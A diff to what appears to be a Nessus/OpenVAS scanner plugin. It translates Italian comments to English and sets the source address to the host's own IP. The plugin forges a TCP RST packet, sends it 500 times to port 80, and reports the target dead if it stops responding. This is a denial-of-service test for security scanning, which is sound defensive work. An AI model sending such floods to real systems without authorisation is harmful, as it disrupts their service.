@@ -7,12 +7,12 @@ if(description)	{
 	exit(0);
 }
 
-# COSTANTI
+# Constants
 sport = 1234;
 dport = 80;
-src = "1.2.3.4";
+src = get_host_ip();
 
-# creazione pacchetto ip
+# Create IP packet
 ip = forge_ip_packet(ip_v : 4,
      		 ip_hl : 5,
 		     ip_tos : 0,
@@ -20,14 +20,14 @@ ip = forge_ip_packet(ip_v : 4,
 		     ip_src : src,
 		     ip_ttl : 64);
 
-# creazione pacchetto TCP1
+# Create TCP packet
 tcp = forge_tcp_packet(ip: ip,
 		       th_sport : sport,
 		       th_dport : dport,
 			   th_flags : TH_RST
 );
 
-# invia i pacchetti TCP 500 volte
+# Send TCP packets 500 times
 start_denial();
 send_packet(tcp) x 500;
 alive = end_denial();
@@ -35,5 +35,4 @@ alive = end_denial();
 if (!alive){
 	set_kb_item(name:"Host/dead", value:TRUE);
 	security_hole(0);
-
 }
